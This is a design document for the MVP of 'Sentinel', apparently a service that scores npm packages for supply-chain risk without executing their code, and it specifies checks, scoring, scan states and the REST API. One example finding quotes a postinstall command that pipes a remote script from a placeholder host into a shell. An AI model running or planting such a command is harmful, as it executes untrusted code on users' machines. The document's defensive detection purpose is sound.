# MVP Scope

## Goal

A user enters an npm package name and gets a risk report: a score from 0 to 100, a risk level, and a list of findings, each with the evidence that triggered it.

Everything not needed for that is out of the MVP.

## Safety rule

Package code is never executed. The analyzer only reads files and registry metadata.

- Tarballs are downloaded and extracted inside a throwaway container with no network access.
- No `npm install`, no `require`/`import` of package files, no lifecycle scripts.
- The extracted files are deleted when the scan ends.

## User flow

1. A visitor submits a package name, and optionally a version (default: `latest`). No login is needed.
2. The API creates a scan with status `queued` and returns its id immediately.
3. A worker runs the scan in the background.
4. The client polls the scan until it is `completed` or `failed`, then shows the report.

Logged-in users get the same flow; their scans are linked to their account for history (later).

## In scope

| Area | What is included |
| --- | --- |
| Auth | Optional. Register with username, email and password; login with username or email; JWT, `USER` and `SUPER_ADMIN` roles |
| Scans | Public. Scan one package version per request, processed asynchronously by a worker |
| Rate limiting | Per-IP limit on `POST /scans` |
| Collector | Registry metadata, weekly downloads and the version tarball |
| Checks | 1. Install scripts, 2. Typosquatting, 3. Obfuscation, 4. Maintainer and publish anomalies, 5. Suspicious dependencies |
| Scoring | One 0 to 100 score and a risk level per scan |
| Storage | Packages, versions, scans and findings saved in PostgreSQL |
| Reviews | `reviews` table exists in the schema; no UI or API for it yet |
| Web | Scan form and report page |
| Docs | OpenAPI spec served by the API |

## Out of scope (later)

- Scan history page
- Bulk scan of a `package.json`
- Per-user quotas
- Re-using a previous scan of the same version instead of scanning again
- Review management and dataset export
- CLI tool and GitHub Action
- Scanning private registries or scoped packages that need auth

## Scan lifecycle

| Status | Meaning |
| --- | --- |
| `queued` | Saved and waiting for a worker |
| `running` | A worker picked it up |
| `completed` | All checks ran and a score was saved |
| `failed` | The scan stopped; `error` says why |

Failure reasons: `package_not_found`, `version_not_found`, `tarball_too_large`, `timeout`, `internal_error`.

## Scoring

- Each check returns zero or more findings: `{ checkType, severity, summary, evidence }`.
- Severity is `low`, `medium` or `high`.
- A scoring function combines the findings into a score from 0 to 100. The weights are decided when checks 3 to 5 are built.
- Risk level from the score (initial values, to be tuned with real data):

| Score | Level |
| --- | --- |
| 0 to 39 | `low` |
| 40 to 69 | `medium` |
| 70 to 100 | `high` |

## API contract

### Response format

Every response, success or error, has the same shape:

```json
{
  "status": 200,
  "message": "Success",
  "data": {}
}
```

- `status`: the HTTP status code, always equal to the response's real status.
- `message`: a short human-readable result.
- `data`: the payload. Omitted on most errors; validation errors (`400`) put the list of problems in it.
- `error`: on errors, the HTTP error name, e.g. `Conflict`.
- `context`: on errors, the request that failed, e.g. `POST /auth/register`.

```json
{
  "status": 409,
  "message": "Username is already taken",
  "error": "Conflict",
  "context": "POST /auth/register"
}
```

```json
{
  "status": 400,
  "message": "Validation failed",
  "data": ["Email must be a valid email address", "Password must be at least 8 characters"],
  "error": "Bad Request",
  "context": "POST /auth/register"
}
```

The examples below show `data` only.

The `id` field in every payload is the row's `uid`, a 10-character random id like `k3F9x2Mq7A`; internal integer ids are never exposed.

### Auth

Every route needs an access token (`Authorization: Bearer <token>`) unless it is public. On public routes the token is optional, but an invalid one is rejected with `401`.

| Endpoint | Access | Body | `data` |
| --- | --- | --- | --- |
| `POST /auth/register` | Public | `userName`, `email`, `password` | `accessToken`, `tokenType`, `expiresIn`, `user` |
| `POST /auth/login` | Public | `userNameOrEmail`, `password` | Same as register |
| `POST /auth/refresh` | Refresh cookie | | `accessToken`, `tokenType`, `expiresIn` |
| `POST /auth/logout` | Refresh cookie | | `null` |
| `GET /auth/me` | Logged in | | `id`, `userName`, `email`, `role` |

- `userName`: 3 to 30 characters, `a-z`, `0-9`, `_`, `-`. Username and email are stored lowercase.
- `password`: 8 to 128 characters.
- Errors: `400` invalid body, `401` wrong credentials or token, `409` username or email already in use.

#### Access and refresh tokens

- The **access token** (15 minutes by default) is returned in `data` and sent as `Authorization: Bearer <token>`.
- The **refresh token** (7 days by default) is never in the body. Register, login and refresh set it in the `refresh_token` cookie: `httpOnly`, `SameSite=Strict`, `Path=/auth`, and `Secure` in production.
- When the access token expires, the client calls `POST /auth/refresh`. The browser sends the cookie automatically (the web app must use `credentials: 'include'`). The response has a new access token and the cookie gets a new refresh token.
- Each refresh token works once and is tracked in Redis. Using an already-used refresh token is treated as theft: every refresh token of that user is revoked and they must log in again.
- `POST /auth/logout` revokes the refresh token and clears the cookie.

### Scans and packages

These endpoints are public. When a valid JWT is sent to `POST /scans`, the scan is linked to that user.

#### `POST /scans`

Start a scan.

Request:

```json
{
  "packageName": "some-package",
  "version": "1.2.3"
}
```

- `packageName`: required, must be a valid npm package name.
- `version`: optional, exact version. Defaults to the `latest` dist-tag.

Response `202 Accepted`, `data`:

```json
{
  "id": "k3F9x2Mq7A",
  "status": "queued",
  "packageName": "some-package",
  "version": "1.2.3",
  "createdAt": "2026-10-20T10:00:00.000Z"
}
```

`data.status` is the scan status, not the HTTP status. `version` is `null` when none was given; the worker resolves `latest`.

Errors: `400` invalid body, `401` a token was sent but is invalid, `429` rate limit exceeded.

#### `GET /scans/:id`

Get a scan and its report.

Response `200 OK` (completed), `data`:

```json
{
  "id": "k3F9x2Mq7A",
  "status": "completed",
  "packageName": "some-package",
  "version": "1.2.3",
  "riskScore": 82,
  "riskLevel": "high",
  "findings": [
    {
      "checkType": "install_scripts",
      "severity": "high",
      "summary": "postinstall runs a remote shell script",
      "evidence": "curl http://x.y/z | sh"
    },
    {
      "checkType": "typosquatting",
      "severity": "medium",
      "summary": "Name is 1 edit away from a popular package",
      "evidence": "some-packages"
    }
  ],
  "error": null,
  "createdAt": "2026-10-20T10:00:00.000Z",
  "startedAt": "2026-10-20T10:00:01.000Z",
  "completedAt": "2026-10-20T10:00:09.000Z"
}
```

While `queued` or `running`, `riskScore`, `riskLevel` and `completedAt` are `null` and `findings` is `[]`. When `failed`, `error` holds the failure reason.

Errors: `404` scan not found.

#### `GET /packages/:name`

Get a package Sentinel has scanned and the latest scan of each scanned version. Scoped names are URL-encoded (`%40scope%2Fname`).

Response `200 OK`, `data`:

```json
{
  "name": "some-package",
  "versions": [
    {
      "version": "1.2.3",
      "latestScan": {
        "id": "k3F9x2Mq7A",
        "status": "completed",
        "riskScore": 82,
        "riskLevel": "high",
        "completedAt": "2026-10-20T10:00:09.000Z"
      }
    }
  ]
}
```

Errors: `404` package never scanned.

## Limits

Initial values, adjustable through config:

| Limit | Value |
| --- | --- |
| Max tarball size | 50 MB |
| Scan timeout | 120 seconds |
| Scans per IP | 10 per hour |

## Done when

- A visitor, logged in or not, submits a package name in the web app and sees a scored report with explained findings.
- The API is deployed and documented with OpenAPI.
